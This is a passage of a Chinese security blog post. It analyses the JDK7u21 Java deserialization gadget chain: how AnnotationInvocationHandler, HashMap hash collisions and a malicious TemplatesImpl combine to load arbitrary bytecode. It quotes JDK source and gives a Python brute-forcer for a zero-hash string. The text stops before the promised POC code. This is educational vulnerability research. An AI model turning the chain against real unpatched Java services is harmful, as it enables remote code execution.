<!DOCTYPE html>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>
        :root {
            --accent-color: #FF4D4D;
        }
    </style>

    
    
    
    
    
    

    
    <title>觑觎 JDK7u21、8u20 反序列化链</title>
    <meta name="description" content="">
    <meta name="keywords" content='Web'>

    <meta property="og:url" content="https://kingbridgess.github.io/posts/jdk7u21-8u20/">
    <meta property="og:type" content="website">
    <meta property="og:title" content="觑觎 JDK7u21、8u20 反序列化链">
    <meta property="og:description" content="">
    <meta property="og:image" content="">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="觑觎 JDK7u21、8u20 反序列化链">
    <meta name="twitter:description" content="">
    <meta property="twitter:domain" content="https://kingbridgess.github.io/posts/jdk7u21-8u20/">
    <meta property="twitter:url" content="https://kingbridgess.github.io/posts/jdk7u21-8u20/">
    <meta name="twitter:image" content="">

    
    <link rel="canonical" href="https://kingbridgess.github.io/posts/jdk7u21-8u20/" />

    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/normalize.min.css" media="print" onload="this.media='all'">
    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/main.css">
    <link disabled id="dark-theme" rel="stylesheet" href="https://kingbridgess.github.io/css/dark.css">

    <script src="https://kingbridgess.github.io/js/svg-injector.min.js"></script>
    <script src="https://kingbridgess.github.io/js/feather-icons.min.js"></script>
    <script src="https://kingbridgess.github.io/js/main.js"></script>

    
    
</head>
<body>
        <script type="text/javascript">
            
            setThemeByUserPref();
        </script><header class="header">
    <nav class="header-nav">

        

        <div class="nav-title">
            <a class="nav-brand" href="https://kingbridgess.github.io">BRIdGE</a>
        </div>

        <div class="nav-links">
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/posts/"> Posts </a>
            </div>
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/tags/"> Tags </a>
            </div>
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/about"> About </a>
            </div>
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/contact/"> Contact </a>
            </div>
            
            <div class="nav-link">
                <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
            </div>
            

            <span class="nav-icons-divider"></span>
            <div class="nav-link dark-theme-toggle">
                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
                <a>
                    <span id="theme-toggle-icon" data-feather="moon"></span>
                </a>
            </div>

            <div class="nav-link" id="hamburger-menu-toggle">
                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
                <a>
                    <span data-feather="menu"></span>
                </a>
            </div>

            
            <ul class="nav-hamburger-list visibility-hidden">
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/posts/"> Posts </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/tags/"> Tags </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/about"> About </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/contact/"> Contact </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
                </li>
                
                <li class="nav-item dark-theme-toggle">
                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
                    <a>
                        <span id="theme-toggle-icon" data-feather="moon"></span>
                    </a>
                </li>
            </ul>

        </div>
    </nav>
</header>
<main id="content">
    <div class="post container">
    <div class="post-header-section">
        <h1>觑觎 JDK7u21、8u20 反序列化链</h1>
        <small role="doc-subtitle"></small>
        <p class="post-date">
            October 31, 2022
        </p>

        <ul class="post-tags">
        
            <li class="post-tag"><a href="https://kingbridgess.github.io/tags/web">Web</a></li>
        
        </ul>
    </div>

    <div class="post-content">
        <p>
            <h1 id="前言">前言</h1>
<p>2015年Frohoff不仅给出了CommonsCollections的反序列化链，更给出了无第三方依赖的Jdk7u21链。同年Wouter Coekaerts提出了较高版本Jdk8u20的绕过思路。今天我站在巨人的肩膀上试图觑觎这两条鄙人目前认为最复杂的两条链。</p>
<h1 id="jdk7u21">JDK7u21</h1>
<h2 id="hashmap">HashMap</h2>
<p>在分析前，先学习一个非常重要的数据结构&ndash;哈希表。关于这方面的文章网上很多。</p>
<p><a href="https://zhuanlan.zhihu.com/p/84327339">一篇文章教你读懂哈希表-HashMap</a></p>
<p>在Java中已经封装好了这样一个类 &ndash; <code>HashMap</code></p>
<p><a href="https://zhuanlan.zhihu.com/p/79219960">HashMap源码分析（jdk1.8，保证你能看懂） - 知乎专栏</a></p>
<p>在Java HashMap中，哈希表对应的“桶”就是属性<code>table</code></p>
<p>Jdk1.7</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6272a4">// The table, resized as necessary. Length MUST Always be a power of two.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">transient</span> Entry<span style="color:#ff79c6">&lt;</span>K<span style="color:#ff79c6">,</span>V<span style="color:#ff79c6">&gt;[]</span> table <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>Entry<span style="color:#ff79c6">&lt;</span>K<span style="color:#ff79c6">,</span>V<span style="color:#ff79c6">&gt;[])</span> EMPTY_TABLE<span style="color:#ff79c6">;</span>
</span></span></code></pre></div><p>Jdk1.8 改成了Node，有可能建立一个红黑树。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6272a4">/**
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * The table, initialized on first use, and resized as
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * necessary. When allocated, length is always a power of two.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * (We also tolerate length zero in some operations to allow
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> * bootstrapping mechanics that are currently not needed.)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">transient</span> Node<span style="color:#ff79c6">&lt;</span>K<span style="color:#ff79c6">,</span>V<span style="color:#ff79c6">&gt;[]</span> table<span style="color:#ff79c6">;</span>
</span></span></code></pre></div><p>而Node或Entry就是table上的每一个节点。插入或查找元素时HashMap会根据hash(key)的值计算出table对应的位置。如果哈希不冲突，则直接放入单个Node(Entry)；如果哈希冲突，则放入由Node(Entry)单链表或红黑树中。</p>
<p><img src="https://s2.loli.net/2022/11/04/ZSfijKDICxXhGY7.webp" alt="img"></p>
<h2 id="利用链分析">利用链分析</h2>
<p>当用AnnotationInvocationHandler代理的对象调用equals方法时会调用如下方法</p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">private</span> Boolean <span style="color:#50fa7b">equalsImpl</span><span style="color:#ff79c6">(</span>Object var1<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>var1 <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">true</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(!</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">type</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">isInstance</span><span style="color:#ff79c6">(</span>var1<span style="color:#ff79c6">))</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        Method<span style="color:#ff79c6">[]</span> var2 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">getMemberMethods</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> var3 <span style="color:#ff79c6">=</span> var2<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">int</span> var4 <span style="color:#ff79c6">=</span> 0<span style="color:#ff79c6">;</span> var4 <span style="color:#ff79c6">&lt;</span> var3<span style="color:#ff79c6">;</span> <span style="color:#ff79c6">++</span>var4<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            Method var5 <span style="color:#ff79c6">=</span> var2<span style="color:#ff79c6">[</span>var4<span style="color:#ff79c6">];</span>
</span></span><span style="display:flex;"><span>            String var6 <span style="color:#ff79c6">=</span> var5<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            Object var7 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">memberValues</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>var6<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            Object var8 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>            AnnotationInvocationHandler var9 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">asOneOfUs</span><span style="color:#ff79c6">(</span>var1<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>var9 <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                var8 <span style="color:#ff79c6">=</span> var9<span style="color:#ff79c6">.</span><span style="color:#50fa7b">memberValues</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>var6<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                    var8 <span style="color:#ff79c6">=</span> var5<span style="color:#ff79c6">.</span><span style="color:#50fa7b">invoke</span><span style="color:#ff79c6">(</span>var1<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>InvocationTargetException var11<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>IllegalAccessException var12<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> AssertionError<span style="color:#ff79c6">(</span>var12<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(!</span>memberValueEquals<span style="color:#ff79c6">(</span>var7<span style="color:#ff79c6">,</span> var8<span style="color:#ff79c6">))</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">true</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>关键在<code>var5.invoke(var1)</code>这一行，是可以调用任意对象任意方法的。其中var5是可控的AnnotationInvocationHandler的属性。仿照CC3链，如果把var1设置为包含字节码的templates，var5设置为getOutputProperties方法，就可以加载任意字节码。</p>
<p>而众所周知hashMap(或者hashTable)在put的时候会有对key.equal的操作（在CC7链中也有相应的利用）</p>
<p>HashMap#readObject有这样一段代码，在反序列化流中循环读取K,V并依次put到map中：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd">int</span> i<span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">&lt;</span>mappings<span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">++)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    K key <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>K<span style="color:#ff79c6">)</span> s<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>    V value <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>V<span style="color:#ff79c6">)</span> s<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>    putForCreate<span style="color:#ff79c6">(</span>key<span style="color:#ff79c6">,</span> value<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>进入putForCreate后，需要计算key的hash值，如果出现了hash冲突，且key完全一样，则把值更新</p>
<p>HashMap#putForCreate</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">putForCreate</span><span style="color:#ff79c6">(</span>K key<span style="color:#ff79c6">,</span> V value<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> hash <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">null</span> <span style="color:#ff79c6">==</span> key <span style="color:#ff79c6">?</span> 0 <span style="color:#ff79c6">:</span> hash<span style="color:#ff79c6">(</span>key<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> indexFor<span style="color:#ff79c6">(</span>hash<span style="color:#ff79c6">,</span> table<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">/**
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         * Look for preexisting entry for key.  This will never happen for
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         * clone or deserialize.  It will only happen for construction if the
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         * input Map is a sorted map whose ordering is inconsistent w/ equals.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">         */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(</span>Entry<span style="color:#ff79c6">&lt;</span>K<span style="color:#ff79c6">,</span>V<span style="color:#ff79c6">&gt;</span> e <span style="color:#ff79c6">=</span> table<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">];</span> e <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span> e <span style="color:#ff79c6">=</span> e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">next</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        Object k<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">hash</span> <span style="color:#ff79c6">==</span> hash <span style="color:#ff79c6">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">((</span>k <span style="color:#ff79c6">=</span> e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">key</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">==</span> key <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">(</span>key <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span> <span style="color:#ff79c6">&amp;&amp;</span> key<span style="color:#ff79c6">.</span><span style="color:#50fa7b">equals</span><span style="color:#ff79c6">(</span>k<span style="color:#ff79c6">))))</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">value</span> <span style="color:#ff79c6">=</span> value<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    createEntry<span style="color:#ff79c6">(</span>hash<span style="color:#ff79c6">,</span> key<span style="color:#ff79c6">,</span> value<span style="color:#ff79c6">,</span> i<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p><code>key.equals(k)</code>中的key和k都是完全可以控制的。但是要走到这一步必须保证put进去的两个key hash值相等。跟进HashMap#hash看看是怎么计算的</p>
<p>会发现只和k.hashCode()的值有关。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">final</span> <span style="color:#8be9fd">int</span> <span style="color:#50fa7b">hash</span><span style="color:#ff79c6">(</span>Object k<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> h <span style="color:#ff79c6">=</span> 0<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>useAltHashing<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>k <span style="color:#ff79c6">instanceof</span> String<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> sun<span style="color:#ff79c6">.</span><span style="color:#50fa7b">misc</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Hashing</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">stringHash32</span><span style="color:#ff79c6">((</span>String<span style="color:#ff79c6">)</span> k<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        h <span style="color:#ff79c6">=</span> hashSeed<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    h <span style="color:#ff79c6">^=</span> k<span style="color:#ff79c6">.</span><span style="color:#50fa7b">hashCode</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// This function ensures that hashCodes that differ only by
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// constant multiples at each bit position have a bounded
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">// number of collisions (approximately 8 at default load factor).
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    h <span style="color:#ff79c6">^=</span> <span style="color:#ff79c6">(</span>h <span style="color:#ff79c6">&gt;&gt;&gt;</span> 20<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">(</span>h <span style="color:#ff79c6">&gt;&gt;&gt;</span> 12<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> h <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">(</span>h <span style="color:#ff79c6">&gt;&gt;&gt;</span> 7<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">(</span>h <span style="color:#ff79c6">&gt;&gt;&gt;</span> 4<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>梳理一下，假设被AnnotationInvocationHandler代理的对象为proxy，恶意TemplatesImpl为templates，那这里就需要构造两个key，一个是proxy，一个是templates。</p>
<p>templates的hashCode继承的是Object的native方法，完全不可知</p>
<p>而调用proxy.hashCode会被AnnotationInvocationHandler劫持，实际调用AnnotationInvocationHandler#hashCodeImpl</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd">int</span> <span style="color:#50fa7b">hashCodeImpl</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> var1 <span style="color:#ff79c6">=</span> 0<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Entry var3<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span><span style="color:#ff79c6">(</span>Iterator var2 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">memberValues</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">entrySet</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">iterator</span><span style="color:#ff79c6">();</span> var2<span style="color:#ff79c6">.</span><span style="color:#50fa7b">hasNext</span><span style="color:#ff79c6">();</span> var1 <span style="color:#ff79c6">+=</span> 127 <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">((</span>String<span style="color:#ff79c6">)</span>var3<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getKey</span><span style="color:#ff79c6">()).</span><span style="color:#50fa7b">hashCode</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">^</span> memberValueHashCode<span style="color:#ff79c6">(</span>var3<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getValue</span><span style="color:#ff79c6">()))</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        var3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>Entry<span style="color:#ff79c6">)</span>var2<span style="color:#ff79c6">.</span><span style="color:#50fa7b">next</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> var1<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>分析知道，var1（也就是返回的hash值）是通过AnnotationInvocationHandler.memberValues的所有k,v值计算出来的，而恰恰memberValues又是可控的。于是可以精心构造一个memberValues，使得计算出来的hash值和templates相等。</p>
<p>假设memberValues只有一个entry(k,v)，而k.hashCode()返回0，因为任何数异或0等于它本身，所以实际上计算出的hash就等于v.hashCode()。也就是说，让</p>
<pre tabindex="0"><code>k.hashCode()=0
v=templates
</code></pre><p>就能让<code>proxy.hashCode()==templates.hashCode()</code></p>
<p>由于key被写死成了String类，需要爆破一个hash值为0的String。写了一个python脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwnlib.util.iters <span style="color:#ff79c6">import</span> bruteforce
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> string
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>max1<span style="color:#ff79c6">=</span><span style="color:#bd93f9">2</span><span style="color:#ff79c6">**</span><span style="color:#bd93f9">32</span>
</span></span><span style="display:flex;"><span>max2<span style="color:#ff79c6">=</span><span style="color:#bd93f9">2</span><span style="color:#ff79c6">**</span><span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">int32</span>(x):
</span></span><span style="display:flex;"><span>    x<span style="color:#ff79c6">=</span>x<span style="color:#ff79c6">%</span>max1
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># 其实就是补码反求原码</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> x <span style="color:#ff79c6">if</span> x<span style="color:#ff79c6">&lt;=</span>max2<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">-~</span>(x<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">hashCode</span>(s):
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        public int hashCode() {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        int h = hash;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        if (h == 0 &amp;&amp; value.length &gt; 0) {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            char val[] = value;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            for (int i = 0; i &lt; value.length; i++) {
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">                h = 31 * h + val[i];
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            }
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            hash = h;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        }
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        return h;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    }
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    h<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>    n<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">len</span>(s)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(n):
</span></span><span style="display:flex;"><span>        h<span style="color:#ff79c6">=</span>int32(int32(<span style="color:#bd93f9">31</span><span style="color:#ff79c6">*</span>h)<span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">ord</span>(s[i]))
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> h
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(bruteforce(<span style="color:#ff79c6">lambda</span> x: hashCode(x) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>, string<span style="color:#ff79c6">.</span>printable, length<span style="color:#ff79c6">=</span><span style="color:#bd93f9">5</span>))
</span></span></code></pre></div><p>吃了个晚饭都没跑出来= = 看来没个超算确实不配卷安全</p>
<p><img src="https://s2.loli.net/2022/11/04/jl8YzecMKvJg4Nf.png" alt="image-20221031195521465"></p>
<p>好在ysoserial已经送了我们一个这样的字符串<code>f5a5a608</code></p>
<p><img src="https://s2.loli.net/2022/11/04/PCXL4csrHa75jZB.png" alt="image-20221031212035200"></p>
<h2 id="精简版poc">精简版POC</h2>
<p>根据上面的分析，可以写出下面这个精简版POC</p>
